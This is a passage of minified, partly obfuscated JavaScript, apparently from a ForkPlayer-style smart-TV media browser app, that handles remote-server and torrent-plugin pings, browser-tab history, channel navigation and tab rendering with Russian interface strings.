c.Remote.ping()}}else{if(s=="no"){}else c.widgets.showinfo("Error format respone from RemoteFork "+s,"remote");c.widgets.connected("remote",0,1)}}}},ping:function(init){var c=maJor;var url="http://"+c.params.get('remoteip')+"/test?"+c.getId()+"|"+c.platform()+"|"+c.params.get("name")+"|"+gV(c.user,"email");c.widgets.connected("remote",2,1);uHelper.create("directnoheader").hid().get(url.replace(":80/","/")).parse=function(s){s=s||"";if(s.indexOf("Work")>0){c.widgets.connected("remote",1);if(s.indexOf("Android")>0||c.params.get("remoteip").indexOf(":8028")>0)c.widgets.all.remote.on="android";else c.widgets.all.remote.on="windows";if(s.indexOf("Visual Studio")>0||s.indexOf("RemoteFork Server")>0)c.remote_version=1.2;else c.remote_version=1.1;c.widgets.all.remote.remote_version=c.remote_version;var mc=s.match(/v\. (\d+\.\d+)\./);if(mc){if(mc[1]>=1.40){c.widgets.all.remote.doprf1=doprf1="/hlsproxy";c.widgets.all.remote.doprf2=doprf2="/acestream"}}
mc=s.match(/v\. (.*?)</);if(mc)c.widgets.all.remote.version=c.rf_ver=mc[1]}else{c.widgets.connected("remote",0);c.widgets.all.remote.version=c.rf_ver=c.remote_version=0;c.widgets.all.remote.on=0;if(init)c.Remote.getip()}}},isdisabled:function(m){var c=maJor;this.remote=c.params.get('remote');var t=c.params.get(m);if(t==-1)return 1;if(!this.remote&&!t)return 1;return 0},plugping:function(t){var c=maJor;if(!t||t=="acestream"){c.widgets.disabled("acestream",this.isdisabled("acestream"));if(!this.isdisabled("acestream")&&getip("acestream")){c.widgets.connected("acestream",2,1);uHelper.create("directnoheader").hid().get("http://"+getip("acestream")+"/webui/api/service?method=get_version&format=jsonp&callback=mycallback").parse=function(s){if(gV(s).indexOf("mycallback")!=-1){c.widgets.connected("acestream",1)}else c.widgets.connected("acestream",0)}}}
if(!t||t=="torrserve"){c.widgets.disabled("torrserve",this.isdisabled("torrserve"));if(!this.isdisabled("torrserve")&&getip("torrserve")){c.widgets.connected("torrserve",2,1);uHelper.create("directnoheader").hid().get("http://"+getip("torrserve")+"/echo").parse=function(s){if(gV(s).indexOf(".")>0){c.widgets.all.torrserve.version=s;c.widgets.all.torrserve.on=1;c.widgets.all.torrserve.ip=getip("torrserve");if(c.widgets.all.torrserve.version.indexOf("MatriX")>=0)c.widgets.all.torrserve.version=1.2;c.widgets.connected("torrserve",1)}else c.widgets.connected("torrserve",0)}}}
if(!t||t=="torrserve2"){c.widgets.disabled("torrserve2",this.isdisabled("torrserve2"));if(!this.isdisabled("torrserve2")&&getip("torrserve2")){setTimeout(function(){c.widgets.connected("torrserve2",2,1);uHelper.create("directnoheader").hid().get("http://"+getip("torrserve2")+"/echo").parse=function(s){if(gV(s).indexOf(".")>0){c.widgets.all.torrserve2.version=s;c.widgets.all.torrserve2.on=2;c.widgets.all.torrserve2.ip=getip("torrserve2");if(c.widgets.all.torrserve2.version.indexOf("MatriX")>=0)c.widgets.all.torrserve2.version=1.2;c.widgets.connected("torrserve2",1)}else c.widgets.connected("torrserve2",0)}},500)}}}},flength:function(n){return ToSize(maJor.read(n).length)},readDef:function(n){var c=this;if(!n||n=="enteres")c.enteresObj=lIlI1VBOOlI01QYpr(c.read("enteres"))||[];if(!n||n=="datas")c.userTop=lIlI1VBOOlI01QYpr(maJor.read("datas"))||{};if(!n||n=="times")c.ftimes=lIlI1VBOOlI01QYpr(maJor.read("times"))||{};if(!n||n=="ordered")c.ordered=lIlI1VBOOlI01QYpr(maJor.read("ordered"))||null},start:function(){try{var c=this;window.showinform=c.inf;if(!c.init_style)c.appStyles();if(window.document&&$_("pr")&&librarys.exis("json")&&librarys.exis("js")&&(c.body=document.getElementsByTagName('body')[0])){c.readDef();if(c.platform()=="no")c.statusbar("Loading error. PC web browsers are not supported!");else{c.loadinfo("Load js...");c.statusbar("_FPINFO_: _FPForResetAppPressButton_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ or TOOLS");if(c.platform()=="maple")c.statusbar("_FPINFO_: _FPForResetAppPressButton_ TOOLS");else c.statusbar("_FPINFO_: _FPFor reset app press button_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_");try{c.appDivBody();c.statusbar("init style");c.appIDInit();c.statusbar("init id")}catch(e){jsshowErr("INIT "+e.message)}
try{c.Remote.init()}catch(e){jsshowErr("Remote IP "+e.message)}
fEpg.init()}}else{setTimeout(function(){maJor.start()},50);c.statusbar("wait load body...")}}catch(e){jsshowErr("start "+e.message)}
return c}};var Inset={create:function(){var c=Object.create(this);c.id=oInset.tabs.length;c.history=[];c.title="_FPDobroPozhalovat_";c.icon="def";c.fwhistory=[];c.isLoading=0;c.select=0;c.lastselect=null;c.lO10111O0001lOl00Ypr="about:blank";c.loadPage=null;c.oldtvg=0;c.oldselpos98=-2;c.INC=-1;c.is_private=0;c.oldselpos=-2;return c},init:function(n){this.id=oInset.tabs.length;var s=(n==null?"[]":maJor.read("url"+n));this.loadHist(s)},curCh:function(m,v){var c=this;if(m==null){if(c.page==null)return{};else{var ch=c.page.channels[c.select]||{};ch.index=ch.index||c.select;return ch}}else{if(typeof c.curCh()=="undefined")return"";else{if(v==null)return gV(c.curCh(),m);else{c.curCh()[m]=v;return!0}}}},is_ifr:function(ch){var c=this;if(c.page==null)return 0;if(c.page.IFRAMES.length==0)return 0;if(ch==null)ch=c.curCh();if(gV(ch,"iframe")=="")return 0;else return 1},mark:function(id,m,el){var c=this;if($_("ch"+id)==null){return}
$_("ch"+id).sel=m;var curPage=c.page;if(m){$_("ch"+id).className=$_("ch"+id).className.replace(/default/g,"selected");if(c.page.getTypePos(c.curCh(),c.select)=="list"){if(c.select>=0)titleRoll.start()}
var desc=gV(c.curCh("description")).toString().replace(/<(.?)css>/g,"<$1style>");var ch=c.curCh();var bhtml="";if(typeof ch.green=="object"){bhtml+='<span onclick=\'parent.keyHandler({"keycode":parent.VK_GREEN});\'><div style="display: inline-block;border-radius:2px;padding: 6px; background: green;margin: 0px 3px;"></div> '+ch.green.title+"</span>"}
if(gV(ch,"yellow_url")!=""){if(gV(ch,"yellow_title")=="")ch.yellow_title=ch.yellow_url;ch.yellow={"title":ch.yellow_title,"playlist_url":ch.yellow_url}}
if(typeof ch.yellow=="object"){bhtml+='<span onclick=\'parent.keyHandler({"keycode":parent.VK_YELLOW});\'><div style="display: inline-block;border-radius:2px;padding: 6px; background: yellow;margin: 0px 1px 0px 4px;"></div> '+ch.yellow.title+"</span>"}
if(bhtml!=""){$_("bbot").style.display="block";$_("bbot","<div style='float:right;background:#3f4b50;padding:4px 6px;'>"+bhtml+"</div>")}else $_("bbot").style.display="none";if(desc!==""&&c.select>=0&&gV(ch,"template").indexOf("$description")==-1){$_("description").style.display="block";$_("description",desc);if(c.page.getTypePos(c.curCh(),c.select)=="list"){var i=c.select;while(i>=0&&c.page.getTypePos(curPage.channels[i],i)=="list"){i--}
i++}else{var i=c.select;while(i<curPage.channels.length&&c.page.getTypePos(curPage.channels[i],i)!="list")i++}
if(gV(gP().global,"startcontent")){if(i<gP().global.startcontent)i=gP().global.startcontent}
if(i>=0&&i<curPage.channels.length){var top_l=buff.scrollsitetop();var ch_pos=$_("ch"+i).offsetTop-top_l;if(ch_pos<=0)ch_pos=0;else if(ch_pos>$_("scrollsite").offsetHeight)ch_pos=$_("scrollsite").offsetHeight;ch_pos=Math.ceil(ch_pos);$_("description").style.top=(ch_pos)+"px";$_("description").style.maxHeight=($_("scrollsite").offsetHeight-ch_pos)+"px"}}else{$_("description").style.display="none";$_("description","")}
if(gP("is_iptv")>2){fEpg.getfull()}
if(c.select>=0&&(vPlayer.is_mini()||maJor.params.get("pip")==2||(maJor.params.get("pip")==1&&gP("is_iptv")>2))){vPlayer.stream.setPip(c.curCh())}}else{$_("ch"+id).className=$_("ch"+id).className.replace(/selected/g,"default")}},wheel:function(event){var c=this;var curPage=c.page;var delta;event=event||window.event;if(event.wheelDelta){delta=event.wheelDelta/120;if(window.opera)delta=-delta}else if(event.detail){delta=-event.detail/3}
if(handler=='menu'){var s=c.select-3*delta;if(s<0)Il01QllQll().focused(0);else if(s>=curPage.channels.length)c.focused(curPage.channels.length-1);else{if(c.select>=0&&c.page.getTypePos(c.curCh(),c.select)=="list")c.focused(s);else if(delta<0)keyHandler({"keycode":VK_DOWN,"isTrusted":!0});else keyHandler({"keycode":VK_UP,"isTrusted":!0})}
if(event.preventDefault)event.preventDefault();event.returnValue=!1}},getId:function(){var id;if(insetSelect<=oInset.tabs.length)id="inset"+insetSelect;else id=oInset.allI()[insetSelect];return id},lastHintSel:0,hint:function(){var c=this;var link="",dop="";if($_("statbar2").style.display!="none"&&gV($_("statbar2"),"mode")=="link")return;if(gV($_("statbar2"),"mode")=="hint")$_("statbar2").style.display="none";if(c.select>=0&&c.page){dop=(getSelect()+1)+"/"+c.page.channels.length+" ";var x=curCh().rates;if(x&&x[2]){if(x[2]>80)var cc="#229900";else if(x[2]>50)cc="#446600";else if(x[2]>30)cc="#e79010";else cc="#ec4b3f";dop+="<span style='color:"+cc+";'>[rate: "+x[2]+"%,"+(x[3])+"]</span> "}
var link=c.curCh("playlist_url")+c.curCh("stream_url");if(c.curCh("search_on")!="")link=c.curCh("search_on");if(link=="submenu")link="[]";if(link=="md5hash")link=c.curCh("parser");if(c.curCh("sourceurl")!=""){c.ifrurl=1;$_("navurl",getInfoUrl(c.curCh("sourceurl")))}else if(c.ifrurl){c.ifrurl=0;$_("navurl",getInfoUrl(c.page.lO10111O0001lOl00Ypr))}}else if(c.select==-1){if(insetSelect<oInset.tabs.length){if(insetSelect==insetActive&&c.lastHintSel!=-4){}else maJor.widgets.showinfo("<b>"+oInset.tabs[insetSelect].get("title")+"</b><div>"+oInset.tabs[insetSelect].get("url").substr(0,200)+(insetSelect==insetActive?"<br><i>Нажмите чтобы закрыть</i>":"<br><i>Нажмите чтобы переключить</i>"),"inset"+insetSelect)}else if(insetSelect==oInset.tabs.length)return maJor.widgets.showinfo("_FPDobroPozhalovat_","inset"+insetSelect);else link=oInset.allI()[insetSelect]}else if(c.select==-3){link=String(gP().menu[menuSel].title).replace(/<.*?>/,"")}
c.lastHintSel=c.select;if(link!="")maJor.statusbar(dop+link,"hint")},focused:function(n,el){var c=this;if(c.page)c.page.renderChannels(n,"focused",c,el)},sPosMaxY:function(){var c=this;var y=0;for(var i in c.page.sPos)if(c.page.sPos[i][1]>y)y=c.page.sPos[i][1];return y},sPosGetMaxXbyRow:function(r){var c=this;var y=0;for(var i in c.page.sPos)if(c.page.sPos[i][0]>y&&c.page.sPos[i][1]==r)y=c.page.sPos[i][0];return y},sPosGetXbyRow:function(px,py){var c=this;var max=c.sPosGetMaxXbyRow(py);if(c.page&&gV(c.page.global,"perPage"))var perPage=gV(c.page.global,"perPage");else perPage=startX;if(px>max)px=Math.ceil((px/perPage)*max);var tmp=px;for(var i in c.page.sPos){if(c.page.sPos[i][0]==px&&c.page.sPos[i][1]==py)return i;else if(c.page.sPos[i][1]==py)tmp=i-1}
return tmp+1},posStart:function(x,y){var c=this;oldselect=c.select;if(typeof c.page=="undefined")var count=0;else{count=c.page.channels.length;if(c.INC!=-1){if(c.INC<c.page.inc){return}}}
if(count==0&&c.select>-1)return c.focused(-1);c.select=parseInt(c.select);if(c.select>=0&&c.page.sPos[c.select]){c.page.posX=c.page.sPos[c.select][0];c.page.posY=c.page.sPos[c.select][1]}
if(x!=0){if(c.select>=0&&c.page.getTypePos(c.curCh(),c.select)=="list"){if((c.select+x*10)<0)c.select=0;else if((c.select+x*10)>=count){if(gV(c.page.global,"next_page_url")!=""&&c.select==count-1){var ttl=c.title.match(/^Стр. (\d+) \/ (.*)$/);if(ttl!=null)var title="Стр. "+(ttl[1]*1+1)+" / "+ttl[2];else title="Стр. 2 / "+c.title;var xp={"title":title,"icon":""+c.icon,"playlist_url":gV(c.page.global,"next_page_url")};if(gV(pq.elCh,"local"))xp.local=gV(pq.elCh,"local");c.navigate(xp)}else c.select=count-1}else c.select=(1*c.select)+x*10}else c.select=(1*c.select)+x}else if(y!=0){if(y==1){if(c.select==-1||c.page.posY==c.sPosMaxY()){if(c.page.posY==c.sPosMaxY()){$_("controlcontent").style.paddingBottom="70px";buff.scrollsitetop(buff.scrollsitetop()+70);setTimeout('$_("controlcontent").style.paddingBottom="43px";',100);if($_("description"))$_("description").scrollTop+=100;return}
c.select=c.sPosGetXbyRow(c.page.posX,0)}else{c.select=c.sPosGetXbyRow(c.page.posX,++c.page.posY)}}else{if(c.select==-1)c.select=c.sPosGetXbyRow(c.page.posX,c.sPosMaxY());else if(c.page.posY==0)c.select=-1;else c.select=c.sPosGetXbyRow(c.page.posX,--c.page.posY);if($_("description"))$_("description").scrollTop=0}}
return c.focused(c.select)},play:function(n,mode){var c=this;if(n!=null)c.select=n;if(!vPlayer.stopped&&c.select>=0&&!curCh("playlist_url")&&vPlayer.is_mini()==2&&vPlayer.player().setMini){if(vPlayer.getCur()>0&&vPlayer.playElement.ident==getIdent(c.select)){if(adsPage.state()){adsPage.state(0)}else{vPlayer.playElement.mini=0;vPlayer.renderPlayer();vPlayer.player().setMini();vPlayer.showPlayer(1)}}else{vPlayer.lll0Q10I0lI1O0Oll0OOYpr();setTimeout("Il01QllQll().play();",200)}}else{if(c.isLoading){c.stopLoad();c.loadPage=null;c.isLoading=0}
if(c.select>=0&&c.select<c.page.channels.length){c.navigate(c.page.channels[c.select],mode)}}},navigate:function(el,mode,goBack,inputed){var c=this;if(gV(c.page,"is_mark")){if(c.page.is_mark_array[c.select])c.page.is_mark_array[c.select]=0;else c.page.is_mark_array[c.select]=1;return c.focused()}
if(el&&el.from_menu){}else if(c.loadPage!=null){c.stopLoad();setTimeout(function(){c.navigate(el,mode,goBack,inputed)},50);return}
if(el==null)return c.play();if(typeof el=="string")el={"title":el,"playlist_url":el,"stream_url":""};if(gVs(el,"playlist_url").match(/^http:\/\/(fxmlparsers\.in\.net|fxmlparsers\.ru)\/?$/)){el={title:"Видео и кинопарсеры от FXMLPARSERS",position:"html",logo_30x30:maJor.parsers.link()+"icons/movicon.png",playlist_url:"http://fxmlparsers.in.net/",playlist_url2:"http://p3.fxmlparsers.in.net/",playlist_url3:"http://fxmlparsers.in.net.exec3.remotecurl.appfxml.com/",cors:"directnoheader",timeout:4,error:"http://5.180.45.229/errstat.php?info=%INFO"}}
is_loadpage(1);c.loadPage=FXMLPage.create();c.loadPage.parentURL=gV(c.page,"lO10111O0001lOl00Ypr");c.loadPage.parentIMG=gV(c.page,"icon");c.loadPage.parentTITLE=gV(c.page,"title");c.loadPage.title=gV(el,"title");c.loadPage.icon=gV(el,"logo_30x30");c.loadPage.lO10111O0001lOl00Ypr=gVs(el,"playlist_url")+gVs(el,"stream_url");c.loadPage.SAVE_lO10111O0001lOl00Ypr=(maJor&&maJor.urlFilter)?maJor.urlFilter(gV(el,"playlist_url")):gV(el,"playlist_url");c.loadPage.count=-1;if(gV(el,"iframeid")!==""){goBack=!0;if(gV(el,"sourceurl")!="")c.loadPage.l01lI10Il1zvj10lI1Ypr=2;else c.loadPage.l01lI10Il1zvj10lI1Ypr=1}
el.index=c.select;c.isLoading=1;c.el=el;maJor.sethash();var param={"elCh":el,"origelCh":lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(el)),"top":buff.scrollsitetop(),"elGlobal":{},"mode":mode,"l10I0O1I1lRl0QlI1OYpr":c,"goBack":goBack,"inputed":inputed,"input":{}};if(gV(mode)=="refresh")param.refresh=!0;if(c.page&&c.page.input)param.input=c.page.input;if(c.loadPage.lO10111O0001lOl00Ypr.match(/#cache_miss$/)){var data={"cachemiss":1,"title":c.lO10111O0001lOl00Ypr,"before":"<div style='margin-top:30px;margin-left:200px;text-align:left;'><img style='margin-left: -20px;' width='90' src='"+icoerr+"' /><div style='font-weight:bold;font-size:120%;'>Эта страница не может быть загружена из кеша</div>Для повторного выполнения действий вебстраницы вернитесь назад и повторите ввод данных<br>"+"ERR_CACHE_MISS<br></div>","typeList":"start","channels":[]};data.channels.push({"logo_30x30":"none","position":"hlink","title":"Назад","playlist_url":"cmd:historyback(1);"});data.icon="err";param.data=data;c.loadPage.toChannels(param)}else if(gV(el,"navigateurl")!=""){param.data=el;c.loadPage.lO10111O0001lOl00Ypr=gV(el,"navigateurl");c.loadPage.toChannels(param)}else c.loadPage.openCh(param)},stopLoad:function(){var c=this;clearTimeout(lIIO1IIcvlI00O1Ypr);if(c.loadPage!=null){c.loadPage.cancel()}
c.isLoading=0;if(waitc.start){uHelper.waitcurl("abort")}
if(is_ifr()){var curPage=c.page;curPage.IFRAMES=[];for(var i in curPage.channels){curPage.channels[i].iframe="";curPage.channels[i].iframeid=""}}
xhr2=null;xhr=null;xhr4=null;is_loadpage(0)},stop:function(){var c=this;if(c.loadPage!=null){c.loadPage.cancel()}
if(c.page!=null){c.page.cancel()}
c.focused()},cleargo:function(){var c=this;if(gV(c.page,"is_mark")){c.page.is_mark=!1;c.page.marked=!1;c.page.is_mark_array={}}
favarray=null},replace:function(ch){var c=this;c.cleargo();if(ch!=null)gP().channels=ch;gP().renderChannels(getSelect(),"update");c.focused()},reload:function(){var c=this;c.cleargo();c.navigateHist(-1,!0)},back:function(){var c=this;c.cleargo();vPlayer.stream.stoPip();if(c.loadPage)c.stopLoad();else c.navigateHist(-2)},forward:function(k){var c=this;if(k==null)k=0;if(!c.fwhistory[k])kjtYpr.inf("_FPEmpty forward history_!",1500);else{for(var i=0;i<=k;i++)c.history.push(c.fwhistory.shift());c.save();c.navigateHist()}},navigateHist:function(k,refresh){var c=this;c.cleargo();fEpg.stop();if(c.loadPage){c.stopLoad();setTimeout(function(){c.navigateHist(k,refresh)},50);return}
if(k==null)k=-1;else k=parseInt(k);var n=c.history.length+k;c.lastResel="";if(!c.history[n])kjtYpr.inf("_FPEmpty return history_!",1500);else{if(k<-1){if(c.get("b")=="1"){kjtYpr.popUp("_FPEtaVklBzabl_!<br>_FPDlRvIn_ _FPMenu_ / _FPRazblVkl_",1500);return}else{for(var i=-1;i>k;i--)c.fwhistory.unshift(c.history.pop());}}
var x=c.history[n];if(gV(x,"url")==""){c.history.pop();c.navigateHist()}else{if(k==-1&&!c.lO10111O0001lOl00Ypr)c.lO10111O0001lOl00Ypr=x.url;var CI=x.url.split("#submenu")[0];if(CI==kjtYpr.llII0lOCvOQO0OYpr)maJor.Password="";if(!gV(x,"is"))breakScreen(getInfoUrl(x.url));var ch={"title":x.title,"logo_30x30":x.img,"stream_url":x.url.replace("#stream_url",""),"playlist_url":"","parser":gV(x,"p"),"local":gV(x,"l"),"mb_parser":gV(x,"mp")};if(prev[CI]){if(gV(prev[CI],"cacheinfo")=="nocache"||refresh){delete(prev[CI])}else if(c.lO10111O0001lOl00Ypr.indexOf("#submenu")>0){if(gV(prev[CI],"url")=="")prev[CI].url=getInfoUrl(x.url)}
var nO=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(prev[CI]));if(nO&&x.url.match(/^(http|searchEngines|view-source:)/)){goBack=!0;c.page=FXMLPage.create();c.page.typeSource="cache";c.page.count=-1;c.page.lO10111O0001lOl00Ypr=c.page.SAVE_lO10111O0001lOl00Ypr=x.url;c.isLoading=0;c.page.channels=[];c.page.global={};nO.window=gV(x,"is");nO.returnSelect=gV(x,"s");nO.returnTop=gV(x,"top");if(typeof nO.setcookie!="undefined")delete nO.setcookie;var pq={"elCh":ch,"data":nO,"mode":null,"l10I0O1I1lRl0QlI1OYpr":c,"goBack":goBack};c.page.toChannels(pq);if(x.url.indexOf("extensions://")==0){$_("ext").style.display="block";ext_focus()}
c.save();return}}
if(x.url.indexOf("#stream_url")>0){if(is_hdgo(x.url))ch.menu_url="hdgo";norek=!0;c.navigate(ch)}else{if(refresh){x.s=getSelect();var mode="refresh"}else mode=null;c.navigate({"title":x.title,"defaultSelect":gV(x,"s"),"logo_30x30":x.img,"playlist_url":x.url,"parser":gV(x,"p"),"local":gV(x,"l"),"mb_parser":gV(x,"mp"),"stream_url":""},mode,!0)}
c.save()}}},getTitle:function(){var c=this;var t=String((c.page&&c.page.title)||c.get("title")).replace(/<.*?>/g,"").replace(/'/g,"");if(c.loadPage!=null&&l0OII100kdNdQl01lYpr(c.get("url"))){if(c.isLoading)return c.loadPage.lO10111O0001lOl00Ypr}
t=t||c.get("url");if(c.is_private)t="*"+t;return t},getIcon:function(){var c=this;var im=(c.page&&c.page.icon)||"";if(im=="none")im="";var image=(im||this.get("img")).replace(/<.*?>/g,"").replace(/'/g,"");if(image==""){for(var j=this.history.length-2;j>=0;j--){if(this.history.img!=""){image=gV(this.history[j],"img");break}}}
return image},save:function(s){try{if(this.is_private)return;if(s==null)s=this.history;if(s.length>100)s=s.slice(-100);maJor.write("url"+this.id,l1OOl0I0IASY10lQ10Ypr(s))}catch(e){jsshowErr("Inset save "+e.message,1)}},get:function(v,k){if(k==null)k=-1;var n=this.history.length+k;if(!this.history[n])return"";else if(v==null)return this.history[n];else return gV(this.history[n],v)},put:function(name,v,k){if(k==null)k=-1;var n=this.history.length+k;if(typeof this.history[n]!='undefined'){this.history[n][name]=v;this.save()}},loadHist:function(s){var c=this;c.history=lIlI1VBOOlI01QYpr((s||maJor.read("url"+c.id)))||[];if(!c.history||!c.history.length)c.history=[{"url":"about:blank","title":"_FPDobroPozhalovat_","img":""}];c.title=c.getTitle();c.icon=c.getIcon()},};var oInset={tabs:[],lII11v0O000lYpr:20,insetActive:0,lastInset:0,insetSelect:0,insetSets:{},addtab:function(n){var b=Inset.create();b.init(n);this.tabs.push(b);return b},omni_hor:2,omniSel:function(n){var c=this,m=maJor;if(n!=null){if(n=="+")c.omni_hor++;else if(n=="-")c.omni_hor--;else c.omni_hor=n}
if(c.omni_hor>=m.omniBut.length)c.omni_hor=0;else if(c.omni_hor<0)c.omni_hor=m.omniBut.length-1;for(var i=0;i<m.omniBut.length;i++){if(getSelect()==-4&&c.omni_hor==i)$_(m.omniBut[i].id).style.border="2px solid #5590e7";else $_(m.omniBut[i].id).style.border="2px solid transparent"}},editUrl:function(){if(handler=="menu"){var v=gP("lO10111O0001lOl00Ypr")||IlIll11I("lO10111O0001lOl00Ypr");if(v.indexOf("searchEngines")==0)v=v.split("|")[1];if(v=="about:blank")v="";setSelect(-4);VK.open({el:{"title":"_FPEnter search query or URL_","playlist_url":"searchEngines","type":"omnibox","presearch":"http://spider.appfxml.com/omnibox/?type=all","value":v,"search_on":"_FPEnter search query or URL_"}})}},allI:function(){var m=maJor;var a=[];for(var i=0;i<=oInset.tabs.length;i++){if($_("inset"+i)!=null)a.push("inset"+i)}
m.each(m.widgets.all,function(val,k){if($_(k)&&$_(k).style.display!="none")a.push(k)});return a},listInset:function(){var c=this,m=maJor;if(insetSelect<0)insetSelect=c.allI().length-1;else if(insetSelect>=c.allI().length)insetSelect=0;$_("iactive").style.background='';m.each(c.allI(),function(val,i){var el=$_(val);if(el){if(i==insetActive)var iB="#4b4b4b";else iB="none";if(getSelect()==-1&&insetSelect==i){if(insetSelect==insetActive)$_("iactive").style.background='#4d4b4b';el.style.border="2px solid rgb(85, 144, 231)"}else el.style.border="2px solid transparent";el.style.background=iB;if($_("insetbrd"+i)){if(i==insetActive||i==insetActive-1||((i==insetSelect||i==insetSelect-1)&&getSelect()==-1))$_("insetbrd"+i).style.borderRight="1px solid transparent";else $_("insetbrd"+i).style.borderRight="1px solid #b7b7b7"}
if(lIlI11I1I_q0000I1Ypr(1,[1,0])){el.onclick=function(){if(!c.long_left){insetSelect=i;c.playInset(val)}c.long_left=0};el.onmousemove=function(){if(handler=='menu'&&(getSelect()!=-1||insetSelect!=i)){setSelect(-1);insetSelect=i;linkOver()}};el.onmousedown=function(){setSelect(-1);insetSelect=i;p_d()};el.onmouseleave=function(){maJor.widgets.hideinfo()};el.onmouseup=function(){setSelect(-1);insetSelect=i;p_u()}}}})},renderInset:function(){var c=this,m=maJor;if(c.insCache&&c.insCache==insetActive+"|"+oInset.tabs.length+"|"+$_("finset").offsetWidth)return c.insetUpdate();var html="";var rl=$_("finset").offsetWidth-48;var rlp=100*rl/$_("finset").offsetWidth;var insetW=(rlp/(oInset.tabs.length)).toFixed(2)-0.01;if(oInset.tabs.length<3){insetW=46}
m.each(c.tabs,function(val,i){var dsp="";if(val.icon=="err")var ico=icoerr;else if(val.icon=="none"){dsp="display:none;";ico=icodef}else if(val.getIcon()==""||val.icon=="def")ico=icodef;else ico=_img(val.getIcon());html+="<div style='width:"+insetW+"%;' class='maintab'> <div id='inset"+i+"' class='itab'>"+"<span id='insetbrd"+i+"' class='ibrd'>&nbsp;</span>"+"<div class='dinset' id='dimginset"+i+"' style='"+dsp+"'>"+"<img id='imginset"+i+"' class='insetico' onerror=\"onImgError(this);\" src='"+ico+"' >"+"</div>"+(i==insetActive?"<img id='iactive' onmouseout=\"this.style.background='#636363';\" onmousemove=\"if(handler=='menu') this.style.background='rgb(108, 124, 128)';\" src='"+icoclose+"'/>":"")+"<div id='insetttl"+i+"' class='ittl'>"+val.getTitle()+"</div>"+"</div></div>"});var i=c.tabs.length;html+="<div id='inset"+i+"' class='newinset'>+"+"<div id='insetttl"+i+"' style='overflow: hidden;'></div>"+"</div>";$_("finset",html);c.listInset();c.insCache=insetActive+"|"+oInset.tabs.length+"|"+$_("finset").offsetWidth},panel:{is_hide:function(){return($_("panel").style.display=="none")},set_hide:function(){if(!maJor.params.get("panel")&&!l0OII100kdNdQl01lYpr()&&(getSelect()>=0)||getSelect()==-3){$_("panel").style.display="none";$_("upbar").style.display="block";$_("site",null,1).style.top="0px";if(gV(gP("global"),"padding")!==""&&!isNaN(gV(gP("global"),"padding")))var pPad=gV(gP("global"),"padding");else pPad=maJor.panelPad;$_("site",null,1).style.paddingTop=pPad+"px";$_("scrollsite").style.height=(maJor.screen().h*100/maJor.params.get("zoom")-pPad).toFixed(0)+"px";if($_("hint"))$_("hint").style.top="0px"}},hover:function(){var c=this;setTimeout(function(){c.set_show();c.setpanel()},200)},set_show:function(){if(this.is_hide()){$_("panel").style.display="block";$_("upbar").style.display="none";$_("site",null,1).style.paddingTop="0px";var siteTop=75;if(maJor.params.get("sidebar")>0)siteTop=102;$_("site",null,1).style.top=siteTop+"px";if(maJor.params.get("zoom")!=100)siteTop=$_('panel').offsetHeight;$_("scrollsite").style.height=((maJor.screen().h*100/maJor.params.get("zoom"))-siteTop).toFixed(0)+"px";if($_("hint"))$_("hint").style.top="54px"}},trigger:function(){clearTimeout(this.timer);this.timer=setTimeout(function(){oInset.panel.set_hide()},3000)},setpanel:function(){if(l0OII100kdNdQl01lYpr()||(getSelect()<0&&getSelect()!=-3))this.set_show();else if(!maJor.params.get("panel"))this.trigger();else this.set_show()}},newInset:function(m){var c=this;if(oInset.tabs.length==oInset.lII11v0O000lYpr){kjtYpr.popUp("Уже открыто максимальное количество вкладок!",2000);return}
breakScreen("about:blank");oInset.tabs.push(OeInit(Inset));insetActive=oInset.tabs.length-1;if(m)Il01QllQll().is_private=1;c.renderInset();c.listInset();gotoStart()},playInset:function(v){var c=this;if($_("ext").style.display=="block")$_("ext").style.display="none";if($_("vk").style.display!="none"){$_("vk").style.display="none";maJor.setHandler("menu")}
chGroupSel=0;if(insetSelect!=insetActive)oInset.tabs[insetActive].stopLoad();if(insetSelect==oInset.tabs.length)c.newInset(0);else if(insetSelect>oInset.tabs.length){if(!v)v=c.allI()[insetSelect];return maJor.widgets.open(v)}else if(insetSelect!=insetActive){insetActive=insetSelect;c.renderInset();FXMLPage.l1I1IQlO1ZkV1IOOOllYpr();Il01QllQll().navigateHist(-1);c.listInset();maJor.seSt=[];maJor.Password=""}else if(insetSelect==insetActive){if(oInset.tabs[insetActive].get("b")=="1")kjtYpr.popUp("_FPEtaVklBzabl_!<br>_FPDlRvIn_ _FPMenu_ / _FPRazblVkl_",1500);else{confirmed.create("_FPClose tab_? "+oInset.tabs[insetSelect].title,null,"_FPClose all_|_FPClose other tabs_|_FPClose_|_FPCancel_").fun=[function(){oInset.closeAll()},function(){oInset.closeOther()},function(){oInset.close()}]}}
maJor.write("urlInset",insetActive)},closeAll:function(){var c=this;oInset.tabs=[];c.reset()},closeOther:function(){var c=this;oInset.tabs=[oInset.tabs[insetSelect]];c.reset()},close:function(){var c=this;c.oldinset=oInset.tabs.splice(insetSelect,1);c.reset()},reset:function(){var c=this;for(var i=0;i<oInset.lII11v0O000lYpr;i++){if(oInset.tabs[i]){oInset.tabs[i].id=i;oInset.tabs[i].save()}else maJor.write("url"+i,"")}
if(oInset.tabs.length==0){c.newInset(0)}
if(insetActive>oInset.tabs.length-1)insetActive=oInset.tabs.length-1;insetSelect=insetActive;maJor.write("urlInset",insetActive);c.renderInset();c.listInset();oInset.tabs[insetActive].navigateHist(-1)},insetUpdate:function(){var c=this;var i=insetActive,t=Il01QllQll();if(t&&t.getIcon){if(t.icon=="err")var ico=icoerr;else if(t.icon=="none")ico=icodef;else if(t.getIcon()==""||t.icon=="def")ico=icodef;else ico=_img(t.getIcon());$_("insetttl"+i,t.getTitle());$_("imginset"+i).src=ico;$_("imginset"+i).onerror=function(){onImgError($_("imginset"+i))};$_("dimginset"+i).style.display="";c.listInset()}},getInfoUrl:function(url){url=url||gV(IlIll11I("lO10111O0001lOl00Ypr")||gP("lO10111O0001lOl00Ypr"));if(url.indexOf("/alexkdpulg.php?list=")>0)url=unescape(url.split("?list=")[1]);url=url.replace(/(\?|&)?w_lang=.*$/,"");return url},breakScreen:function(u){u=gV(u);if(u.indexOf("curl ")==0){var m=parseCURL(u);u=m.url}
